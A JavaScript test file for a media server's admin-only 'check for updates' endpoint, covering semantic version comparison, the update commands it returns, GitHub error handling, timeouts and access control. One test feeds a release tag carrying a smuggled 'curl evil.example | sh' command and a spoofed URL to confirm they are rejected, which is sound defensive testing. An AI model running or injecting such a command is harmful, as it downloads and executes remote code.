'use strict';

// "Settings > About > Check for updates": asks GitHub for the latest release only when an
// administrator presses the button, and answers with the commands that update. GitHub is
// simulated.

const { after, before, test } = require('node:test');
const assert = require('node:assert');
const { calls, onRequest, startApp } = require('./helpers/app');
const { bundleSource } = require('./helpers/bundle');

let app;
let current;
let updateCheck;
before(async () => {
  app = await startApp();
  /* eslint-disable global-require */
  current = require('../build/config').Config.version;
  updateCheck = require('../build/updateCheck');
  /* eslint-enable global-require */
});
after(async () => { await app.stop(); });

const GITHUB = 'api.github.com/repos/javimentallab/mediaocd/releases/latest';
const check = (options) => app.api('GET', '/api/update-check', options);
// Wrapped, because a release has a "body" of its own that the fake network would take as the answer.
const release = (tag, extra = {}) => ({ status: 200, body: releaseOf(tag, extra) });
const releaseOf = (tag, extra = {}) => ({
  tag_name: tag,
  name: `MediaOCD ${tag.replace(/^v/, '')}`,
  html_url: `https://github.com/javimentallab/mediaocd/releases/tag/${tag}`,
  published_at: '2026-11-07T10:00:00Z',
  body: '### Added\n\n- **Something new**',
  ...extra,
});
const bump = (version, part) => {
  const n = version.split('-')[0].split('.').map(Number);
  n[part] += 1;
  for (let i = part + 1; i < 3; i++) n[i] = 0;
  return n.join('.');
};

test('versions are compared as Semantic Versioning, not as text', () => {
  const { compareVersions } = updateCheck;
  assert.strictEqual(compareVersions('2.1.2', '2.10.0'), -1);
  assert.strictEqual(compareVersions('v2.1.2', '2.1.2'), 0);
  assert.strictEqual(compareVersions('3.0.0', '2.99.99'), 1);
  assert.strictEqual(compareVersions('2.2.0-rc.1', '2.2.0'), -1);
  assert.strictEqual(compareVersions('2.2.0-rc.2', '2.2.0-rc.10'), -1);
  assert.strictEqual(compareVersions('2.2.0-alpha', '2.2.0-alpha.1'), -1);
  assert.strictEqual(compareVersions('2.2.0-1', '2.2.0-alpha'), -1);
  assert.throws(() => compareVersions('2.2', '2.2.0'));
});

test('a newer release brings its notes and the commands for its tag', async () => {
  const latest = bump(current, 1);
  let headers;
  const remove = onRequest(GITHUB, (url, init) => { headers = init.headers; return release(`v${latest}`); });
  const res = await check();
  remove();
  assert.strictEqual(res.status, 200, res.text);
  assert.deepStrictEqual(res.json, {
    current,
    latest,
    status: 'update',
    name: `MediaOCD ${latest}`,
    url: `https://github.com/javimentallab/mediaocd/releases/tag/v${latest}`,
    publishedAt: '2026-11-07T10:00:00Z',
    notes: '### Added\n\n- **Something new**',
    commands: [
      'git fetch --tags origin',
      `git checkout v${latest}`,
      'docker compose build mediaocd',
      'docker compose up -d mediaocd',
    ],
  });
  assert.strictEqual(headers['User-Agent'], `MediaOCD-updater/${current}`);
  assert.strictEqual(res.headers.get('cache-control'), 'no-store');
});

test('the same version says it is the latest, and a newer one here says so too', async () => {
  let remove = onRequest(GITHUB, release(`v${current}`));
  let res = await check();
  remove();
  assert.deepStrictEqual([res.json.status, res.json.latest, res.json.commands], ['latest', current, []]);

  remove = onRequest(GITHUB, release('v0.0.1'));
  res = await check();
  remove();
  assert.deepStrictEqual([res.json.status, res.json.latest, res.json.commands], ['newer', '0.0.1', []]);
});

test('what GitHub says is checked before it reaches the page or a command', async () => {
  const removers = [onRequest(GITHUB, release('v9.9.9; curl evil.example | sh'))];
  let res = await check();
  assert.deepStrictEqual([res.status, res.json.error, res.json.current], [502, 'bad-response', current]);

  const latest = bump(current, 0);
  removers.push(onRequest(GITHUB, release(`v${latest}`, { html_url: 'https://evil.example/', name: '', body: null })));
  res = await check();
  removers.forEach((remove) => remove());
  assert.strictEqual(res.json.url, `https://github.com/javimentallab/mediaocd/releases/tag/v${latest}`);
  assert.strictEqual(res.json.name, `MediaOCD ${latest}`);
  assert.strictEqual(res.json.notes, '');
});

test('each way GitHub can fail has its own answer', async () => {
  const cases = [
    [{ status: 404, body: { message: 'Not Found' } }, 'no-release'],
    [{ status: 403, body: { message: 'API rate limit exceeded' }, headers: { 'x-ratelimit-remaining': '0' } }, 'rate-limited'],
    [{ status: 429, body: '' }, 'rate-limited'],
    [{ status: 500, body: 'oops' }, 'bad-response'],
    [{ status: 200, body: '<html>not json</html>' }, 'bad-response'],
  ];
  for (const [answer, code] of cases) {
    const remove = onRequest(GITHUB, answer);
    const res = await check();
    remove();
    assert.deepStrictEqual([res.status, res.json.error], [502, code], JSON.stringify(answer));
  }
});

test('GitHub that does not answer is given up on after the timeout', async () => {
  const never = (url, { signal }) => new Promise((resolve, reject) => {
    signal.addEventListener('abort', () => reject(signal.reason));
  });
  const started = Date.now();
  await assert.rejects(updateCheck.checkForUpdate({ fetchImpl: never, timeoutMs: 50 }), { code: 'timeout' });
  assert.ok(Date.now() - started < 2000);
  const down = async () => { throw new TypeError('fetch failed'); };
  await assert.rejects(updateCheck.checkForUpdate({ fetchImpl: down }), { code: 'unreachable' });
});

test('only an administrator can check, and nobody else makes GitHub be asked', async () => {
  const askedGithub = () => calls.filter((c) => c.url.includes('api.github.com')).length;
  const asked = askedGithub();
  const user = await app.createUser('not-admin');
  assert.strictEqual((await check({ token: user.token })).status, 403);
  assert.strictEqual((await app.request('GET', '/api/update-check')).status, 401);
  assert.strictEqual(askedGithub(), asked);
});

test('the web client asks only from the button in Settings > About, for administrators', () => {
  const source = bundleSource();
  assert.strictEqual(source.split('"/api/update-check"').length - 1, 1, 'one call, in the button');
  assert.ok(source.includes('r.createElement(Wy,null),e.admin&&r.createElement(_UPD,null)'));
  const component = source.slice(source.indexOf('_UPD=function(){'), source.indexOf(',_SVC=function(p){'));
  assert.ok(/var check=function\(\)\{[^]*fetch\("\/api\/update-check"/.test(component));
  assert.ok(!/useEffect/.test(component), 'nothing runs on its own when the page opens');
});
